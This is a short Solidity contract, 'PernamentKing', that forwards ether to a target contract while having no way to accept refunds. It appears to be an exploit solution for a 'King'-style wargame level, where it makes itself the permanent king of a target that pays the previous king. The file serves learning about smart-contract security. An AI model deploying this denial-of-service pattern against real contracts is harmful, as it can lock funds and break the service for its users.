// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PernamentKing {

    function contractTriggersReceive(address contractAddr) public payable {
       (bool success,) = contractAddr.call{value: msg.value}("");
       require(success, "failed");
    }
}
